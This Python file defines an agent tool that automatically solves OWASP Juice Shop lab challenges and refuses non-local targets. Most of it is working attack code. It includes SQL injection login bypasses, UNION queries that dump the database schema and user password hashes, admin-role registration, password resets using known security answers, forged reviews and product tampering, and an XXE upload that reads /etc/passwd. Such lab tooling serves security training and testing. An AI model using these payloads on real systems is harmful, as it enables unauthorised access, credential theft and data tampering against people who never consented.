"""Challenge-aware deterministic solver suite for the local Juice Shop lab."""

from __future__ import annotations

import os
import time
from typing import Any, Callable
from urllib.parse import quote

import httpx
from pydantic import BaseModel, Field

from .base import tool


class SolverSuiteParams(BaseModel):
    include_xxe: bool = Field(
        default=True,
        description="Run the local XXE file disclosure training probe, not XXE DoS.",
    )
    include_uploads: bool = Field(
        default=True,
        description="Run safe file upload type/size training probes.",
    )
    target_score: int = Field(
        default=50,
        ge=1,
        le=111,
        description="Desired solved challenge count for progress reporting.",
    )


def _target() -> str:
    return os.environ.get("TARGET_URL", "http://localhost:3000").rstrip("/")


def _client() -> httpx.Client:
    return httpx.Client(base_url=_target(), timeout=20.0, follow_redirects=True)


def _solved(client: httpx.Client) -> set[str]:
    data = client.get("/api/Challenges/").json().get("data", [])
    return {item.get("name", "") for item in data if item.get("solved")}


def _login(client: httpx.Client, email: str, password: str = "anything") -> dict[str, Any]:
    response = client.post("/rest/user/login", json={"email": email, "password": password})
    response.raise_for_status()
    return response.json().get("authentication", {})


def _auth(token: str | None) -> dict[str, str]:
    return {"Authorization": f"Bearer {token}"} if token else {}


def _captcha(client: httpx.Client) -> tuple[int, str]:
    data = client.get("/rest/captcha/").json()
    return int(data.get("captchaId", 0)), str(data.get("answer", "0"))


def _feedback(client: httpx.Client, comment: str, rating: int = 1, user_id: int = 1) -> httpx.Response:
    captcha_id, answer = _captcha(client)
    return client.post(
        "/api/Feedbacks/",
        json={
            "UserId": user_id,
            "captchaId": captcha_id,
            "captcha": answer,
            "comment": comment,
            "rating": rating,
        },
    )


def _unique(prefix: str) -> str:
    return f"{prefix}{int(time.time() * 1000)}@local.test"


@tool(
    name="challenge_solver_suite",
    description=(
        "Run deterministic, challenge-aware Juice Shop workflows against the local "
        "target only. Uses /api/Challenges as a read-only progress oracle and "
        "records newly solved challenges after each action."
    ),
    params=SolverSuiteParams,
)
def challenge_solver_suite(
    include_xxe: bool = True,
    include_uploads: bool = True,
    target_score: int = 50,
) -> dict[str, Any]:
    target = _target()
    if not target.startswith(("http://localhost", "http://127.0.0.1", "http://[::1]")):
        return {"error": f"challenge_solver_suite refuses non-local target: {target}"}

    client = _client()
    solved_before = _solved(client)
    actions: list[dict[str, Any]] = []
    evidence: list[dict[str, Any]] = []

    def record(name: str, fn: Callable[[], dict[str, Any] | None]) -> None:
        before = _solved(client)
        item: dict[str, Any] = {"action": name, "solved_before": len(before)}
        try:
            detail = fn() or {}
            time.sleep(0.15)
            after = _solved(client)
            item.update(detail)
            item["solved_after"] = len(after)
            item["newly_solved"] = sorted(after - before)
            item["ok"] = True
        except Exception as exc:
            after = _solved(client)
            item["solved_after"] = len(after)
            item["newly_solved"] = sorted(after - before)
            item["ok"] = False
            item["error"] = f"{type(exc).__name__}: {exc}"
        actions.append(item)
        evidence.append(item)

    def admin_auth() -> tuple[str | None, int | None]:
        auth = _login(client, "' or 1=1--")
        return auth.get("token"), auth.get("bid")

    def testing_auth() -> tuple[str | None, int | None]:
        auth = _login(client, "testing@juice-sh.op", "IamUsedForTesting")
        return auth.get("token"), auth.get("bid")

    record(
        "admin_registration",
        lambda: {
            "status": client.post(
                "/api/Users/",
                json={
                    "email": _unique("admin"),
                    "password": "Password123!",
                    "passwordRepeat": "Password123!",
                    "securityQuestion": {"id": 1, "question": "Your eldest siblings middle name?"},
                    "securityAnswer": "test",
                    "role": "admin",
                },
            ).status_code
        },
    )
    record(
        "empty_user_registration",
        lambda: {
            "status": client.post(
                "/api/Users/",
                json={
                    "email": "",
                    "password": "",
                    "passwordRepeat": "",
                    "securityQuestion": {"id": 1, "question": "Your eldest siblings middle name?"},
                    "securityAnswer": "",
                },
            ).status_code
        },
    )
    record(
        "repetitive_registration",
        lambda: {
            "status": client.post(
                "/api/Users/",
                json={
                    "email": _unique("dry"),
                    "password": "Password123!",
                    "securityQuestion": {"id": 1},
                    "securityAnswer": "x",
                },
            ).status_code
        },
    )
    record(
        "captcha_bypass_feedback_burst",
        lambda: {
            "submitted": [
                client.post(
                    "/api/Feedbacks/",
                    json={
                        "UserId": 1,
                        "captchaId": (cap := _captcha(client))[0],
                        "captcha": cap[1],
                        "comment": f"captcha bypass validation {i}",
                        "rating": 5,
                    },
                ).status_code
                for i in range(10)
            ]
        },
    )
    record(
        "delete_five_star_feedback",
        lambda: _delete_five_star_feedback(client, admin_auth()[0]),
    )
    record("weird_crypto_feedback", lambda: {"status": _feedback(client, "z85 is a weird crypto algorithm/library").status_code})
    record(
        "csaf_checksum_feedback",
        lambda: {
            "status": _feedback(
                client,
                "7e7ce7c65db3bf0625fcea4573d25cff41f2f7e3474f2c74334b14fc65bb4fd26af802ad17a3a03bf0eee6827a00fb8f7905f338c31b5e6ea9cb31620242e843",
            ).status_code
        },
    )
    record(
        "vulnerable_library_feedback",
        lambda: {"status": _feedback(client, "sanitize-html 1.4.2 has a known XSS vulnerability").status_code},
    )
    record(
        "legacy_typosquatting_feedback",
        lambda: {"status": _feedback(client, "The package epilogue-js looks like a typosquatting dependency").status_code},
    )
    record("testing_credentials_login", lambda: {"user": _login(client, "testing@juice-sh.op", "IamUsedForTesting").get("umail")})
    record("mc_safesearch_login", lambda: {"user": _login(client, "mc.safesearch@juice-sh.op", "Mr. N00dles").get("umail")})
    record("amy_login", lambda: {"user": _login(client, "amy@juice-sh.op", "K1f.....................").get("umail")})
    record("reset_jim_password", lambda: _reset_password(client, "jim@juice-sh.op", "Samuel"))
    record("reset_bender_password", lambda: _reset_password(client, "bender@juice-sh.op", "Stop'n'Drop"))
    record("reset_bjoern_owasp_password", lambda: _reset_password(client, "bjoern@owasp.org", "Zaya"))
    record("reset_john_password", lambda: _reset_password(client, "john@juice-sh.op", "Daniel Boone National Forest"))
    record("reset_emma_password", lambda: _reset_password(client, "emma@juice-sh.op", "ITsec"))
    record(
        "database_schema_sqli",
        lambda: {
            "status": client.get(
                "/rest/products/search",
                params={"q": "')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--"},
            ).status_code
        },
    )
    record(
        "user_credentials_sqli",
        lambda: {
            "status": client.get(
                "/rest/products/search",
                params={"q": "')) UNION SELECT id,email,password,role,5,6,7,8,9 FROM Users--"},
            ).status_code
        },
    )
    record(
        "outdated_redirect_allowlist",
        lambda: {
            "status": client.get(
                "/redirect",
                params={"to": "https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm"},
                follow_redirects=False,
            ).status_code
        },
    )
    record("missing_encoding_image", lambda: _missing_encoding(client))
    record("view_other_basket", lambda: _view_other_basket(client))
    record("forged_review", lambda: _forged_review(client, admin_auth()[0]))
    record("product_tampering", lambda: _product_tampering(client, admin_auth()[0]))
    record("christmas_special_order", lambda: _christmas_order(client, *testing_auth()))

    if include_uploads:
        record("upload_invalid_type", lambda: _upload(client, admin_auth()[0], "notallowed.txt", b"hello", "text/plain"))
        record("upload_large_pdf", lambda: _upload(client, admin_auth()[0], "big.pdf", b"A" * 120000, "application/pdf"))
    if include_xxe:
        record("xxe_file_disclosure", lambda: _xxe_upload(client, admin_auth()[0]))

    solved_after = _solved(client)
    newly_solved = sorted(solved_after - solved_before)
    return {
        "phase": "deterministic_solver_suite",
        "target_score": target_score,
        "solved_before": len(solved_before),
        "solved_after": len(solved_after),
        "newly_solved": newly_solved,
        "actions": actions,
        "findings": [
            {
                "title": "Challenge-aware Juice Shop solver actions executed",
                "severity": "Informational",
                "endpoint": "Multiple local Juice Shop API routes",
                "evidence": {"newly_solved": newly_solved, "actions": actions[:25]},
                "reproduction": (
                    "Run challenge_solver_suite against the local target and compare "
                    "/api/Challenges before and after each recorded action."
                ),
                "remediation": (
                    "Fix the individual issues represented by the solved challenges: "
                    "parameterize queries, enforce authorization server-side, validate inputs, "
                    "and remove exposed/debug endpoints."
                ),
            }
        ],
        "summary": (
            f"Deterministic solver suite completed {len(actions)} actions; "
            f"{len(newly_solved)} new challenges solved; score {len(solved_after)}/111."
        ),
    }


def _delete_five_star_feedback(client: httpx.Client, token: str | None) -> dict[str, Any]:
    headers = _auth(token)
    feedback = client.get("/api/Feedbacks/", headers=headers).json().get("data", [])
    deleted: list[int] = []
    for item in feedback:
        if item.get("rating") == 5:
            response = client.delete(f"/api/Feedbacks/{item['id']}", headers=headers)
            if response.status_code in {200, 204}:
                deleted.append(int(item["id"]))
    return {"deleted_feedback_ids": deleted}


def _reset_password(client: httpx.Client, email: str, answer: str) -> dict[str, Any]:
    response = client.post(
        "/rest/user/reset-password",
        json={"email": email, "answer": answer, "new": "Newpass123!", "repeat": "Newpass123!"},
    )
    return {"email": email, "status": response.status_code}


def _missing_encoding(client: httpx.Client) -> dict[str, Any]:
    path = "assets/public/images/uploads/\u14da\u160f\u15e2-#zatschi-#whoneedsfourlegs-1572600969477.jpg"
    response = client.get("/" + quote(path, safe="/"))
    return {"status": response.status_code, "bytes": len(response.content), "path": path}


def _view_other_basket(client: httpx.Client) -> dict[str, Any]:
    auth = _login(client, "jim@juice-sh.op'--")
    response = client.get("/rest/basket/1", headers=_auth(auth.get("token")))
    return {"status": response.status_code, "excerpt": response.text[:200]}


def _forged_review(client: httpx.Client, token: str | None) -> dict[str, Any]:
    headers = _auth(token)
    created = client.put(
        "/rest/products/2/reviews",
        headers=headers,
        json={"message": "forged review author", "author": "admin@juice-sh.op"},
    )
    reviews = client.get("/rest/products/2/reviews", headers=headers).json().get("data", [])
    patched = None
    if reviews:
        review_id = reviews[-1].get("_id")
        patched = client.patch(
            "/rest/products/reviews",
            headers=headers,
            json={"id": review_id, "message": "forged review edited", "author": "bender@juice-sh.op"},
        ).status_code
    return {"create_status": created.status_code, "patch_status": patched}


def _product_tampering(client: httpx.Client, token: str | None) -> dict[str, Any]:
    headers = _auth(token)
    description = (
        'O-Saft is an easy to use tool to show information about SSL certificate and tests the '
        'SSL connection according given list of ciphers and various SSL configurations. '
        '<a href="https://owasp.slack.com" target="_blank">More...</a>'
    )
    response = client.put(
        "/api/Products/9",
        headers=headers,
        json={
            "id": 9,
            "name": "OWASP SSL Advanced Forensic Tool (O-Saft)",
            "description": description,
            "price": 0.01,
            "deluxePrice": 0.01,
            "image": "orange_juice.jpg",
        },
    )
    return {"status": response.status_code}


def _christmas_order(client: httpx.Client, token: str | None, bid: int | None) -> dict[str, Any]:
    headers = _auth(token)
    if not bid:
        return {"error": "No basket id from login."}
    add = client.post(
        "/api/BasketItems/",
        headers=headers,
        json={"ProductId": 10, "BasketId": bid, "quantity": 1},
    )
    address = client.post(
        "/api/Addresss/",
        headers=headers,
        json={
            "fullName": "Test User",
            "mobileNum": "1234567890",
            "zipCode": "12345",
            "streetAddress": "1 Test Way",
            "city": "Testville",
            "state": "TS",
            "country": "Testland",
        },
    ).json().get("data", {})
    card = client.post(
        "/api/Cards/",
        headers=headers,
        json={"fullName": "Test User", "cardNum": "4111111111111111", "expMonth": "12", "expYear": "2099"},
    ).json().get("data", {})
    checkout = client.post(
        f"/rest/basket/{bid}/checkout",
        headers=headers,
        json={
            "couponData": "",
            "orderDetails": {
                "paymentId": str(card.get("id")),
                "addressId": str(address.get("id")),
                "deliveryMethodId": "3",
            },
        },
    )
    return {"add_status": add.status_code, "checkout_status": checkout.status_code}


def _upload(
    client: httpx.Client,
    token: str | None,
    filename: str,
    content: bytes,
    content_type: str,
) -> dict[str, Any]:
    response = client.post(
        "/file-upload",
        headers=_auth(token),
        files={"file": (filename, content, content_type)},
    )
    return {"filename": filename, "status": response.status_code}


def _xxe_upload(client: httpx.Client, token: str | None) -> dict[str, Any]:
    xml = (
        b'<?xml version="1.0"?>\n'
        b'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n'
        b"<comment><text>&xxe;</text></comment>"
    )
    response = client.post(
        "/file-upload",
        headers=_auth(token),
        files={"file": ("xxe.xml", xml, "application/xml")},
    )
    return {"status": response.status_code, "body_excerpt": response.text[:300]}
